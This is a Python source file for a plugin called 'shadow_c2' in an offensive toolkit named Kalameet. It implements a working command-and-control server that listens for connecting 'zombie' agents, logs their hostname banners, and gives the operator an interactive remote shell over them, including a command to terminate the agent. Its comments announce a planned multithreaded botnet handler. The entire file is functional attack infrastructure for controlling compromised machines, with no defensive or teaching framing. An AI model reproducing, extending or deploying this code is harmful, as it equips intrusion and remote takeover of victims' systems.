import socket
import threading
from kalameet.core.base import BasePlugin
from kalameet.core.logger import Logger
from kalameet.core.interface import Colors

class ShadowC2Plugin(BasePlugin):
    meta = {
        'name': 'shadow_c2',
        'description': 'Command & Control Server (Handle Shadow Agents)',
        'author': 'Kalameet'
    }

    def __init__(self):
        super().__init__()
        self.logger = Logger(session_name="shadow_c2")

    def add_arguments(self, parser):
        parser.add_argument("--port", type=int, default=1337, help="Listening Port")

    def handle_client(self, client_socket, addr):
        print(f"\n{Colors.GREEN}[+] NEW ZOMBIE CONNECTED: {addr[0]}{Colors.ENDC}")
        
        # Terima Banner Awal (Hostname/User)
        try:
            banner = client_socket.recv(1024).decode()
            print(f"{Colors.BLUE}    ID: {banner}{Colors.ENDC}")
            self.logger.log("C2", "CONNECTION", f"Agent connected: {banner}", {"ip": addr[0]})
        except: pass

        # Masuk Mode Shell Interaktif
        while True:
            try:
                cmd = input(f"{Colors.FAIL}ShadowC2 ({addr[0]}) > {Colors.ENDC}")
                
                if cmd.strip() == "": continue
                if cmd == "exit":
                    print("[*] Closing session (Agent stays alive in background)...")
                    client_socket.close()
                    break
                if cmd == "kill":
                    client_socket.send(b"terminate")
                    client_socket.close()
                    break

                # Kirim Perintah
                client_socket.send(cmd.encode())
                
                # Terima Balasan (Buffer besar)
                response = client_socket.recv(4096).decode()
                print(response)
                
                # Log aktivitas
                self.logger.log("C2", "CMD", cmd, {"response_len": len(response)})

            except (ConnectionResetError, BrokenPipeError):
                print(f"{Colors.WARNING}[!] Connection lost. Waiting for agent to reconnect...{Colors.ENDC}")
                break
            except KeyboardInterrupt:
                print("\n[*] Backgrounding session.")
                break

    def run(self, args):
        server_ip = "0.0.0.0"
        print(f"{Colors.HEADER}╔════════════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.HEADER}║      KALAMEET SHADOW C2 SERVER         ║{Colors.ENDC}")
        print(f"{Colors.HEADER}╚════════════════════════════════════════╝{Colors.ENDC}")
        print(f"[*] Listening on {server_ip}:{args.port}...")
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((server_ip, args.port))
            server.listen(5)
        except Exception as e:
            print(f"{Colors.FAIL}[-] Failed to bind port: {e}{Colors.ENDC}")
            return

        print(f"{Colors.BLUE}[*] Waiting for agents to beacon home...{Colors.ENDC}")

        try:
            while True:
                client, addr = server.accept()
                # Untuk versi simpel ini, kita handle 1 client interaktif
                # Di versi 5.0 nanti kita buat multithreaded botnet handler
                self.handle_client(client, addr)
        except KeyboardInterrupt:
            print("\n[!] Server shutting down.")
            server.close()